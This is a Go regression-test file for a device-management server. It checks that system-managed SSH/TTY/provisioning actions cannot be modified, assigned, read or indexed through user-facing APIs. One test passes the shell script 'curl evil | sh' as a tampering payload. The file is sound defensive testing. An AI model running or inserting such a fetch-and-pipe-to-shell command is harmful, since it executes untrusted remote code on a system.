package api_test

import (
	"context"
	"errors"
	"log/slog"
	"sync"
	"testing"

	"connectrpc.com/connect"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	pm "github.com/manchtools/power-manage-sdk/gen/go/pm/v1"
	"github.com/manchtools/power-manage/server/internal/api"
	"github.com/manchtools/power-manage/server/internal/store"
	"github.com/manchtools/power-manage/server/internal/taskqueue"
	"github.com/manchtools/power-manage/server/internal/testutil"
)

// System-managed actions (is_system=true) are created and maintained
// exclusively by the SystemActionManager — they back SSH/TTY/provisioning
// grants. A user-facing RPC must never rename, edit, delete, assign, or
// unassign them, even with action/assignment-write permission. These
// regression tests pin that immutability: each one fails on the pre-guard
// code (the mutation silently succeeds) and passes once the is_system guard
// is in place.

const wantSystemActionCode = "cannot_modify_system_action"

// requireSystemActionRejected asserts the error is the FailedPrecondition
// "system-managed action" rejection — both the connect code and the
// structured error code the web client switches on.
func requireSystemActionRejected(t *testing.T, err error) {
	t.Helper()
	require.Error(t, err, "mutation of a system-managed action MUST be rejected")
	assert.Equal(t, connect.CodeFailedPrecondition, connect.CodeOf(err))
	var ce *connect.Error
	require.True(t, errors.As(err, &ce), "error is not a *connect.Error")
	assert.Equal(t, wantSystemActionCode, errorCode(t, ce))
}

func TestRenameAction_SystemActionRejected(t *testing.T) {
	st := testutil.SetupPostgres(t)
	h := api.NewActionHandler(st, slog.Default(), api.NoOpSigner{})

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	sysActionID := testutil.CreateTestSystemAction(t, st, "pm-tty-paul", int(pm.ActionType_ACTION_TYPE_SHELL))
	ctx := testutil.AdminContext(adminID)

	_, err := h.RenameAction(ctx, connect.NewRequest(&pm.RenameActionRequest{
		Id:   sysActionID,
		Name: "hijacked",
	}))
	requireSystemActionRejected(t, err)
}

func TestUpdateActionDescription_SystemActionRejected(t *testing.T) {
	st := testutil.SetupPostgres(t)
	h := api.NewActionHandler(st, slog.Default(), api.NoOpSigner{})

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	sysActionID := testutil.CreateTestSystemAction(t, st, "pm-ssh-paul", int(pm.ActionType_ACTION_TYPE_SHELL))
	ctx := testutil.AdminContext(adminID)

	_, err := h.UpdateActionDescription(ctx, connect.NewRequest(&pm.UpdateActionDescriptionRequest{
		Id:          sysActionID,
		Description: "tampered",
	}))
	requireSystemActionRejected(t, err)
}

func TestUpdateActionParams_SystemActionRejected(t *testing.T) {
	st := testutil.SetupPostgres(t)
	h := api.NewActionHandler(st, slog.Default(), api.NoOpSigner{})

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	sysActionID := testutil.CreateTestSystemAction(t, st, "pm-provision-paul", int(pm.ActionType_ACTION_TYPE_SHELL))
	ctx := testutil.AdminContext(adminID)

	_, err := h.UpdateActionParams(ctx, connect.NewRequest(&pm.UpdateActionParamsRequest{
		Id: sysActionID,
		Params: &pm.UpdateActionParamsRequest_Shell{
			Shell: &pm.ShellParams{Script: "curl evil | sh"},
		},
	}))
	requireSystemActionRejected(t, err)
}

func TestDeleteAction_SystemActionRejected(t *testing.T) {
	st := testutil.SetupPostgres(t)
	h := api.NewActionHandler(st, slog.Default(), api.NoOpSigner{})

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	sysActionID := testutil.CreateTestSystemAction(t, st, "pm-tty-paul", int(pm.ActionType_ACTION_TYPE_SHELL))
	ctx := testutil.AdminContext(adminID)

	_, err := h.DeleteAction(ctx, connect.NewRequest(&pm.DeleteActionRequest{Id: sysActionID}))
	requireSystemActionRejected(t, err)

	// Positive control: the system action is still there (not deleted). Query
	// the store directly — GetAction now hides system actions as NotFound
	// (#488), so it can't be used to assert survival.
	_, storeErr := st.Repos().Action.Get(context.Background(), sysActionID)
	require.NoError(t, storeErr, "system action must survive the rejected delete")
}

// TestGetAction_SystemActionNotFound pins that a system-managed action's
// content is not readable through GetAction (#488): an admin who pivots
// device → execution → action_id must not be able to fetch the SSH/TTY/
// provisioning grant script. Hidden as NotFound (uniform with out-of-scope),
// while ordinary actions stay gettable.
func TestGetAction_SystemActionNotFound(t *testing.T) {
	st := testutil.SetupPostgres(t)
	h := api.NewActionHandler(st, slog.Default(), api.NoOpSigner{})

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	sysActionID := testutil.CreateTestSystemAction(t, st, "pm-tty-paul", int(pm.ActionType_ACTION_TYPE_SHELL))
	normalID := testutil.CreateTestAction(t, st, adminID, "Normal", int(pm.ActionType_ACTION_TYPE_SHELL))
	ctx := testutil.AdminContext(adminID)

	_, err := h.GetAction(ctx, connect.NewRequest(&pm.GetActionRequest{Id: sysActionID}))
	require.Error(t, err, "a system action must not be readable via GetAction")
	assert.Equal(t, connect.CodeNotFound, connect.CodeOf(err), "hidden as NotFound, not a leaky code")

	// Positive control: a normal action is still gettable.
	resp, err := h.GetAction(ctx, connect.NewRequest(&pm.GetActionRequest{Id: normalID}))
	require.NoError(t, err)
	require.NotNil(t, resp.Msg.Action)
}

func TestCreateAssignment_SystemActionSourceRejected(t *testing.T) {
	st := testutil.SetupPostgres(t)
	actionHandler := api.NewActionHandler(st, slog.Default(), api.NoOpSigner{})
	h := api.NewAssignmentHandler(st, slog.Default(), actionHandler)

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	sysActionID := testutil.CreateTestSystemAction(t, st, "pm-tty-paul", int(pm.ActionType_ACTION_TYPE_SHELL))
	targetUserID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	ctx := testutil.AdminContext(adminID)

	_, err := h.CreateAssignment(ctx, connect.NewRequest(&pm.CreateAssignmentRequest{
		SourceType: pm.AssignmentSourceType_ASSIGNMENT_SOURCE_TYPE_ACTION,
		SourceId:   sysActionID,
		TargetType: pm.AssignmentTargetType_ASSIGNMENT_TARGET_TYPE_USER,
		TargetId:   targetUserID,
	}))
	requireSystemActionRejected(t, err)
}

func TestDeleteAssignment_SystemActionSourceRejected(t *testing.T) {
	st := testutil.SetupPostgres(t)
	actionHandler := api.NewActionHandler(st, slog.Default(), api.NoOpSigner{})
	h := api.NewAssignmentHandler(st, slog.Default(), actionHandler)

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	sysActionID := testutil.CreateTestSystemAction(t, st, "pm-tty-paul", int(pm.ActionType_ACTION_TYPE_SHELL))
	targetUserID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")

	// Seed the assignment the way the SystemActionManager does — directly via
	// an event, bypassing the (now-guarded) CreateAssignment RPC.
	assignmentID := testutil.CreateTestAssignment(t, st, "system",
		"action", sysActionID, "user", targetUserID, 0)
	ctx := testutil.AdminContext(adminID)

	_, err := h.DeleteAssignment(ctx, connect.NewRequest(&pm.DeleteAssignmentRequest{Id: assignmentID}))
	requireSystemActionRejected(t, err)
}

// TestAddActionToSet_SystemActionRejected closes the gap the pre-GA security
// sweep found (#484): a system action added to a user-controlled set would
// resurface its name in the set's search index AND become dispatchable via
// DispatchActionSet — defeating the exact #477 fix. AddActionToSet must reject
// a system action like every other action-referencing mutation.
func TestAddActionToSet_SystemActionRejected(t *testing.T) {
	st := testutil.SetupPostgres(t)
	h := api.NewActionSetHandler(st, slog.Default())

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	setID := testutil.CreateTestActionSet(t, st, adminID, "Test Set")
	sysActionID := testutil.CreateTestSystemAction(t, st, "pm-tty-paul", int(pm.ActionType_ACTION_TYPE_SHELL))
	ctx := testutil.AdminContext(adminID)

	_, err := h.AddActionToSet(ctx, connect.NewRequest(&pm.AddActionToSetRequest{
		SetId:    setID,
		ActionId: sysActionID,
	}))
	requireSystemActionRejected(t, err)

	// Positive control: the set gained no member from the rejected call.
	resp, getErr := h.GetActionSet(ctx, connect.NewRequest(&pm.GetActionSetRequest{Id: setID}))
	require.NoError(t, getErr)
	assert.Equal(t, int32(0), resp.Msg.Set.MemberCount, "a rejected system action must not become a set member")
}

// recordingSearchIndex is a fake api.SearchIndex that records which entity IDs
// the SearchListener tried to reindex vs. remove.
type recordingSearchIndex struct {
	mu        sync.Mutex
	reindexed []string
	removed   []string
}

func (r *recordingSearchIndex) EnqueueReindex(_ context.Context, _, id string, _ *taskqueue.SearchEntityData) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.reindexed = append(r.reindexed, id)
	return nil
}

func (r *recordingSearchIndex) EnqueueRemove(_ context.Context, _, id string, _ []string) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.removed = append(r.removed, id)
	return nil
}

func (r *recordingSearchIndex) GetReverseMembers(_ context.Context, _, _ string) []string {
	return nil
}

func (r *recordingSearchIndex) TouchDeviceLastSeen(_ context.Context, _ string, _ int64) error {
	return nil
}

// TestSearchListener_SystemActionExcludedFromIndex pins the visibility fix: a
// system-managed action must be PURGED from (never reindexed into) the search
// catalog, so it can't surface on the actions list page — while ordinary
// actions still reindex normally.
func TestSearchListener_SystemActionExcludedFromIndex(t *testing.T) {
	st := testutil.SetupPostgres(t)
	rec := &recordingSearchIndex{}
	listener := api.SearchListener(st, rec, slog.Default())

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	sysActionID := testutil.CreateTestSystemAction(t, st, "pm-tty-paul", int(pm.ActionType_ACTION_TYPE_SHELL))
	normalID := testutil.CreateTestAction(t, st, adminID, "Normal", int(pm.ActionType_ACTION_TYPE_SHELL))

	listener(context.Background(), store.PersistedEvent{EventType: "ActionCreated", StreamID: sysActionID, StreamType: "action"})
	listener(context.Background(), store.PersistedEvent{EventType: "ActionCreated", StreamID: normalID, StreamType: "action"})

	assert.Contains(t, rec.removed, sysActionID, "system action must be purged from the search index")
	assert.NotContains(t, rec.reindexed, sysActionID, "system action must NOT be reindexed")
	assert.Contains(t, rec.reindexed, normalID, "ordinary action must still be reindexed")
}

// TestDeleteAction_MissingActionReturnsNotFound pins the CR follow-up: the
// system-action guard loads the action, so DeleteAction must reject a
// nonexistent id with NotFound rather than emitting a phantom ActionDeleted
// event for a stream that never existed.
func TestDeleteAction_MissingActionReturnsNotFound(t *testing.T) {
	st := testutil.SetupPostgres(t)
	h := api.NewActionHandler(st, slog.Default(), api.NoOpSigner{})

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	ctx := testutil.AdminContext(adminID)

	_, err := h.DeleteAction(ctx, connect.NewRequest(&pm.DeleteActionRequest{Id: testutil.NewID()}))
	require.Error(t, err, "deleting a nonexistent action must not succeed")
	assert.Equal(t, connect.CodeNotFound, connect.CodeOf(err))
}

// TestRenameAction_NormalActionStillWorks is the positive control: the guard
// must reject ONLY system actions, never ordinary user-created ones.
func TestRenameAction_NormalActionStillWorks(t *testing.T) {
	st := testutil.SetupPostgres(t)
	h := api.NewActionHandler(st, slog.Default(), api.NoOpSigner{})

	adminID := testutil.CreateTestUser(t, st, testutil.NewID()+"@test.com", "pass", "admin")
	actionID := testutil.CreateTestAction(t, st, adminID, "Normal", int(pm.ActionType_ACTION_TYPE_SHELL))
	ctx := testutil.AdminContext(adminID)

	resp, err := h.RenameAction(ctx, connect.NewRequest(&pm.RenameActionRequest{
		Id:   actionID,
		Name: "Renamed",
	}))
	require.NoError(t, err)
	assert.Equal(t, "Renamed", resp.Msg.Action.Name)
}
